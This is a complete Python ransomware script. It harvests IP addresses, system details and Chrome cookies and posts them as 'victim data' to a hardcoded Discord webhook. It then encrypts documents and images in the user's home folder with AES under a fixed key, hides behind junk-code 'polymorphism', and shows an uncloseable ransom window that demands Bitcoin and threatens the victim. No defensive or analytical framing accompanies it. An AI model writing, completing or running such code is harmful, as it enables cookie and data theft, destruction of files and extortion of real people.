import os
import random
import string
import requests
import json
import browsercookie
import psutil
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
import shutil
import tkinter as tk
from tkinter import messagebox

# Hardcoded decryption key
DECRYPTION_KEY = "mango380%".ljust(32)[:32].encode('utf-8')  # Ensure key is 32 bytes for AES-256
WEBHOOK_URL = "https://discord.com/api/webhooks/1435288952851529740/AbCt00lH-4e8HPf7bLpnDOQ83lHDVHUDIVSrTeNnUuyXAA-QMiv4bu3g4H8t5RvXeuT_"  

# Polymorphic code generation
def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def insert_junk_code():
    junk_snippets = [
        "x = 0; for i in range(100): x += i",
        "useless_var = ' '.join(['a'] * 10)",
        "temp = [i for i in range(50) if i % 2 == 0]"
    ]
    return random.choice(junk_snippets)


# Data exfiltration
def harvest_data():
    data = {}

    # Private IP
    try:
        private_ip = socket.gethostbyname(socket.gethostname())
        data['private_ip'] = private_ip
    except:
        data['private_ip'] = "Unable to retrieve Private IP"

    # Public IP
    try:
        public_ip = requests.get('https://api.ipify.org').text
        data['public_ip'] = public_ip
    except:
        data['public_ip'] = "Unable to retrieve Public IP"

    # System info
    try:
        data['system_info'] = {
            'cpu': psutil.cpu_percent(),
            'memory': psutil.virtual_memory().percent,
            'os': os.name
        }
    except:
        data['system_info'] = "Unable to retrieve system info"

    # Browser cookies
    try:
        cj = browsercookie.chrome()
        cookies = []
        for cookie in cj:
            cookies.append({
                'name': cookie.name,
                'value': cookie.value,
                'domain': cookie.domain
            })
        data['cookies'] = cookies[:10]
    except:
        data['cookies'] = "Unable to retrieve cookies"

    # Password placeholder
    data['passwords'] = "Sample password data (placeholder)"

    return data


# Webhook sender
def send_to_webhook(data):
    payload = {
        'content': f"**New Victim Data**\n```json\n{json.dumps(data, indent=2)}\n```"
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass


# AES encryption
def encrypt_file(file_path):
    try:
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(DECRYPTION_KEY, AES.MODE_CBC, iv)

        with open(file_path, 'rb') as f:
            plaintext = f.read()

        padded_data = pad(plaintext, AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)

        with open(file_path, 'wb') as f:
            f.write(iv + encrypted_data)

        return True
    except:
        return False


# Directory traversal + encryption
def encrypt_files():
    target_extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png']

    for root, dirs, files in os.walk(os.path.expanduser("~")):
        exec(insert_junk_code())
        for file in files:
            if any(file.endswith(ext) for ext in target_extensions):
                file_path = os.path.join(root, file)
                try:
                    encrypt_file(file_path)
                except:
                    continue


# GUI ransom note
def create_ransom_note(data):
    user_name = "Unknown User"
    user_address = "Unknown Address"
    public_ip = data.get('public_ip', 'Unknown Public IP')
    private_ip = data.get('private_ip', 'Unknown Private IP')

    note_content = f"""
WARNING: YOUR DEVICE HAS BEEN COMPROMISED! IMMEDIATE ACTION REQUIRED!

ATTENTION {user_name}: We have gained full access to your system located at {user_address}.
Your personal information is now in our possession, and your digital life is under our control.

CRITICAL DATA EXPOSED:
- Public IP Address: {public_ip}
- Private IP Address: {private_ip}
- Physical Location: {user_address}

WHAT YOU MUST DO NOW:
1. DO NOT SHUT DOWN YOUR DEVICE OR DISCONNECT FROM THE INTERNET.
2. PAY THE DEMANDED RANSOM OF $100 IN BITCOIN:
   - Bitcoin Wallet Address: 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy
3. After payment, instructions will be provided.

WE KNOW WHO YOU ARE, {user_name}. WE KNOW WHERE YOU LIVE, {user_address}.
Time Remaining: 11:59:59
"""

    root = tk.Tk()
    root.title("WARNING: SYSTEM COMPROMISED")
    root.geometry("600x700")
    root.resizable(False, False)
    root.configure(bg='black')

    label = tk.Label(
        root,
        text=note_content,
        fg='red',
        bg='black',
        font=('Arial', 12, 'bold'),
        wraplength=550,
        justify='left'
    )
    label.pack(pady=20, padx=20)

    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.attributes('-topmost', True)
    root.update()
    root.mainloop()


def main():
    temp_var1 = generate_random_string(8)
    temp_var2 = generate_random_string(8)

    globals()[temp_var1] = harvest_data()
    send_to_webhook(globals()[temp_var1])

    globals()[temp_var2] = encrypt_files()

    create_ransom_note(globals()[temp_var1])


if __name__ == "__main__":
    main()
